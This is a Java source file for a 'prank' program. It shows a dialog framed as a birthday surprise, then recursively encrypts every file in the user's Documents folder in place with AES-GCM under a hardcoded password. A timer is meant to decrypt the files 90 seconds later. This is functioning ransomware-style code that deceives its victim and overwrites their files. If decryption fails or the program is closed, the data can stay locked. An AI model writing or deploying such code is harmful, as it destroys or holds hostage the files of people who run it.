import javax.crypto.*;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.*;
import java.io.*;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.Objects;


public class ProgramRun {

    public static byte [] encryptData(String key, byte [] data) throws NoSuchPaddingException,
            NoSuchAlgorithmException,
            InvalidAlgorithmParameterException,
            InvalidKeyException,
            BadPaddingException,
            IllegalBlockSizeException, InvalidKeySpecException {


        SecureRandom secureRandom = new SecureRandom();
        byte[] iv = new byte[12];
        secureRandom.nextBytes(iv);
        SecretKey secretKey = generateSecretKey(key, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);

        byte [] encryptedData = cipher.doFinal(data);
        ByteBuffer byteBuffer = ByteBuffer.allocate(4 + iv.length + encryptedData.length);
        byteBuffer.putInt(iv.length);
        byteBuffer.put(iv);
        byteBuffer.put(encryptedData);
        return byteBuffer.array();
    }


    public static byte [] decryptData(String key, byte [] encryptedData)
            throws NoSuchPaddingException,
            NoSuchAlgorithmException,
            InvalidAlgorithmParameterException,
            InvalidKeyException,
            BadPaddingException,
            IllegalBlockSizeException,
            InvalidKeySpecException {

        ByteBuffer byteBuffer = ByteBuffer.wrap(encryptedData);

        int noonceSize = byteBuffer.getInt();
        if(noonceSize < 12 || noonceSize >= 16) {
            throw new IllegalArgumentException("Nonce size is incorrect. Make sure that the incoming data is an AES encrypted file.");
        }
        byte[] iv = new byte[noonceSize];
        byteBuffer.get(iv);

        SecretKey secretKey = generateSecretKey(key, iv);
        byte[] cipherBytes = new byte[byteBuffer.remaining()];
        byteBuffer.get(cipherBytes);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, secretKey, parameterSpec);

        return cipher.doFinal(cipherBytes);

    }
    public static SecretKey generateSecretKey(String password, byte [] iv) throws NoSuchAlgorithmException, InvalidKeySpecException {
        KeySpec spec = new PBEKeySpec(password.toCharArray(), iv, 65536, 128);
        SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        byte[] key = secretKeyFactory.generateSecret(spec).getEncoded();
        return new SecretKeySpec(key, "AES");
    }
    public static byte[] readFile(String path) throws IOException {

        File file = new File(path);

        byte [] fileData = new byte[(int) file.length()];

        try(FileInputStream fileInputStream = new FileInputStream(file)) {
            fileInputStream.read(fileData);
        }

        return fileData;
    }

    public static void displayFiles(File[] files, String mode) throws NoSuchPaddingException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, IOException, BadPaddingException, IllegalBlockSizeException, InvalidKeyException, InvalidKeySpecException {
        try {
            for (File filename : files){
                System.out.println(filename.getName());
                if (filename.isDirectory()){
                    displayFiles(filename.listFiles(), mode);
                } else {
                    EncryptDecrypt(filename.getAbsolutePath(), mode);
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }

    }

    public static void EncryptDecrypt(String filetomesswith, String mode) throws IOException, NoSuchPaddingException, InvalidKeyException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, InvalidKeySpecException {
        String file = filetomesswith;
        String password = "ur mom";

        byte[] resultBytes = null;

        if(mode.equalsIgnoreCase("encrypt")){
            byte[] fileBytes = ProgramRun.readFile(file);
            resultBytes = ProgramRun.encryptData(password, fileBytes);
        }else {
            byte[] fileToDecrypt = ProgramRun.readFile(file);
            resultBytes = ProgramRun.decryptData(password, fileToDecrypt);
        }

        Path path = Paths.get(filetomesswith);
        Files.write(path, resultBytes);
    }

    public static void main(String[] args) throws NoSuchPaddingException, InvalidKeyException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException, InvalidAlgorithmParameterException, InvalidKeySpecException, IOException {
        JFrame jframe = new JFrame();
        JOptionPane.showMessageDialog(jframe, "Please do not shut down your computer or stop this program from running." +
                " Hit OK once you want to proceed with my birthday surprise!");
        //CONTROL PANEL
        String pathname = System.getProperty("user.home") + "/Documents";
        File[] files = new File(pathname).listFiles();
        displayFiles(files, "encrypt");
        ////////////////
        JOptionPane.showMessageDialog(jframe, "Hey. Open some of your files in the Documents folder. " +
                "YEP your files are encrypted with AES128 now. But don't worry! It's just a prank lol.\" +\n" +
                "                \"This software will decrypt all of your affected files in 90 seconds after you" +
                "click OK. Did you laugh? Did you shit your pants? Let me know!");
        new java.util.Timer().schedule(
                new java.util.TimerTask() {
                    @Override
                    public void run() {
                        try {
                            displayFiles(files, "decrypt");
                            JOptionPane.showMessageDialog(jframe, "Files successfully decrypted");
                            JOptionPane.showMessageDialog(jframe, "Thanks for being such a good sport! And please, if anything went wrong, contact me" +
                                    " and I'll aid you in fixing whatever it is. Have a good day!");
                            System.exit(1);
                        } catch (Exception e){
                            e.printStackTrace();
                            JOptionPane.showMessageDialog(jframe, "Looks like something went wrong if you see this message." +
                                    "Please contact me and go to worstprogrammer7636 on github to download decryption software");
                        }

                    }
                }, 90000
        );

    }

}
